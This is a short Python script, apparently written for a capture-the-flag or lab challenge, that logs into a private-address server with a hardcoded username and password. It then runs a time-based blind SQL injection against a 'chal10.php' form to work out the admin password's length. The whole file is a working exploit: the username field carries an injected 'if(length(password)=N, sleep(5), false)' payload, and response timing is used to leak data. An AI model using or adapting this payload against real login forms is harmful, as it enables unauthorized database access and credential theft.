import urllib
import urllib2
import requests
import sys
import time

url = 'https://172.27.20.32:8443/login.php'
values = {'username': 'sumedh',
          'password': 'CXbXPGbNfXNvBEL'}

session = requests.session()
r = session.post(url, data=values, verify=False)
#print r.content

url = 'https://172.27.20.32:8443/chal10.php'
for i in range(6,40):
	print "Trying ", i
	values = {'username' : 'admin" and if(length(password)=' + str(i) + ', sleep(5), false); select * from users where username="a'}
	#values = {'username' : 'admin" AND length(password)=' + str(i) + ' AND username="admin'}
	start = time.time()
	r = session.post(url, data=values, verify = False)
	end = time.time()
	t = end - start
	print "Time - ", t
	if t > 3:
		print "Length of the password is " + str(i)
		sys.exit(0)

